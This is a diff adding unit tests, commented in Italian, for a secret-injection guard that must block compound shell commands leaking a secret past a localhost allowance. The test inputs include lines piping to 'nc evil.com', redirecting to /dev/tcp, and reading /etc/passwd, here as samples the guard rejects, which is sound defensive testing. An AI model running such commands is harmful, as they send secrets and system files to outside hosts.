@@ -3,7 +3,7 @@
  */
 import {
   setSecret, setAllowLocalHttp, listSecretsMeta, hasSecret, referencedSecrets, extractHosts, hasFileOrPipeExfil, hasInsecureHttp,
-  hasHostPinning, isLoopbackLiteral, checkSink, injectSecrets, injectIntoStrings, scanIngress, autoSealIngress, loadFromEnv, clearSealed,
+  hasCommandComposition, hasHostPinning, isLoopbackLiteral, checkSink, injectSecrets, injectIntoStrings, scanIngress, autoSealIngress, loadFromEnv, clearSealed,
 } from "../../src/sealed-secrets.mjs";
 import { getDynamicSecrets, clearSecrets } from "../../src/secrets-registry.mjs";
 import { redactText } from "../../src/secrets-redact.mjs";
@@ -236,6 +236,44 @@ const reset = () => { clearSealed(); clearSecrets(); };
   setSecret("LJ", "jwt-real-value-xyz789", { allowLocalHttp: true });
   const inj = injectIntoStrings(["curl http://localhost:3000 -H 'Authorization: Bearer {{secret:LJ}}'"], "strict");
   ok(inj.injected.includes("LJ") && inj.strings[0].includes("jwt-real-value-xyz789") && !inj.blocked.length, "LOCALHTTP: injection reale verso loopback (valore sostituito, non bloccato)");
+}
+
+// 12) allowLocalHttp — fix review-loop 2026-06-30 (P0 composizione/multi-URL, modi, loadFromEnv) ----
+{
+  reset();
+  setSecret("LJ2", "jwt-xyz-1234567890", { allowLocalHttp: true });
+  // P0 fix: comando COMPOSTO verso loopback → BLOCCATO (un secondo canale d'uscita riapre l'exfil)
+  ok(!checkSink("LJ2", "curl http://localhost:3000 ; nc evil.com 80", "strict").allowed, "COMP: '; nc' → bloccato");
+  ok(!checkSink("LJ2", "curl http://localhost:3000 && curl http://localhost/x", "strict").allowed, "COMP: '&&' → bloccato");
+  ok(!checkSink("LJ2", "curl http://localhost:3000 | tee /tmp/x", "strict").allowed, "COMP: pipe → bloccato");
+  ok(!checkSink("LJ2", "curl http://localhost:3000 1>/dev/tcp/evil.com/80", "strict").allowed, "COMP: /dev/tcp → bloccato");
+  ok(!checkSink("LJ2", "curl http://localhost:3000 $(cat /etc/passwd)", "strict").allowed, "COMP: $() → bloccato");
+  // P0 fix: secondo URL invisibile a extractHosts (2://) → countUrls=2 → bloccato
+  ok(!checkSink("LJ2", "curl http://localhost:3000 2://evil.com", "strict").allowed, "COMP: secondo URL (2://evil.com) → bloccato (countUrls)");
+  // shape PULITA verso loopback → consentita ANCHE con query &param (no falso-positivo)
+  ok(checkSink("LJ2", "curl http://localhost:3000/api/renew?a=1&b=2 -H 'Authorization: Bearer {{secret:LJ2}}'", "strict").allowed, "COMP: shape pulita con query &param → consentita");
+  // hasCommandComposition unit
+  ok(hasCommandComposition("a ; b") && hasCommandComposition("a && b") && hasCommandComposition("a | b") && hasCommandComposition("a\nb") && hasCommandComposition("x $(y)") && hasCommandComposition("x 1>/dev/tcp/h/80"), "COMP: separatori/sub/dev-tcp/newline riconosciuti");
+  ok(!hasCommandComposition("curl http://localhost/x?a=1&b=2"), "COMP: &param di URL NON è composizione (no falso-positivo)");
+
+  // P2-e: off → nessun gating; warn → il fast-path loopback vale comunque
+  reset();
+  setSecret("LJ3", "jwt-off-123456", { allowLocalHttp: true });
+  ok(checkSink("LJ3", "curl http://localhost/x", "off").allowed, "MODE: off → consentito a prescindere");
+  ok(checkSink("LJ3", "curl http://localhost/x", "warn").allowed, "MODE: warn → fast-path loopback consentito");
+
+  // P2-d: loadFromEnv con metadata allowLocalHttp → flag onorato al boot
+  reset();
+  const loaded = loadFromEnv({ SEALED_SECRET_LCFG: "jwt-cfg-123456" }, { LCFG: { allowLocalHttp: true } });
+  ok(loaded.includes("LCFG"), "ENV: secret caricato da env");
+  ok(listSecretsMeta().find((m) => m.name === "LCFG").allowLocalHttp === true, "ENV: allowLocalHttp da metadata onorato");
+  ok(checkSink("LCFG", "curl http://localhost/x", "strict").allowed, "ENV: secret loaded con allowLocalHttp → http loopback consentito");
+
+  // setAllowLocalHttp: solo `true` abilita (no truthiness sorprese, allineato a setSecret)
+  reset();
+  setSecret("LJ4", "jwt4-123456", {});
+  setAllowLocalHttp("LJ4", "yes"); // stringa truthy ma ≠ true
+  ok(!checkSink("LJ4", "curl http://localhost/x", "strict").allowed, "TRUTHINESS: setAllowLocalHttp('yes') NON abilita (solo true)");
 }
 
 console.log(`\nsealed-secrets test: ${passed} passed, ${failed} failed`);
